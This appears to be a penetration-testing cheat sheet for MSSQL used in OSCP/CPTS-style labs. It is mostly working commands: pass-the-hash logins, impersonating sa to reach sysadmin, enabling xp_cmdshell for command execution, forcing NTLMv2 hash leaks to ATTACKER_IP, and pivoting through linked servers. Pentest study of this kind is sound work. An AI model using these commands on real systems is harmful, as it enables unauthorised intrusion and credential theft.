---
id: mssql-enum
title: MSSQL Enumeration
stage: enumeration
tags: [windows, mssql]
tools:
  - nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET
  - mssqlclient.py -db msdb 'DOMAIN/user:password@$TARGET'
  - mssqlclient.py -db msdb -windows-auth 'DOMAIN/user:password@$TARGET'
leads_to:
  - public-exploit
  - sqli-rce
  - rev-shell
---

## Connect

```bash
# Windows auth (domain user)
mssqlclient.py -windows-auth $DOMAIN/user:password@$TARGET

# SQL auth
mssqlclient.py $TARGET -U sa -P password

# Pass-the-hash
mssqlclient.py -windows-auth $DOMAIN/user@$TARGET -hashes :NTLM_HASH
```

## Escalate to sysadmin via Impersonation

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 = success
```

## xp_cmdshell → RCE

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';  -- check SeImpersonatePrivilege → GodPotato
```

## Steal NTLMv2 Hash (if xp_cmdshell blocked)

```sql
-- Start Responder first: sudo responder -I tun0
EXEC xp_dirtree '\\ATTACKER_IP\share';
EXEC xp_fileexist '\\ATTACKER_IP\share\test';
```

## Linked Servers (pivot through MSSQL)

```sql
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
-- Run commands on linked server:
EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [linkedserver\instance]
```

## Notes

SQL Server service accounts almost always have `SeImpersonatePrivilege` → GodPotato/PrintSpoofer → SYSTEM. This is a very common OSCP/CPTS path.
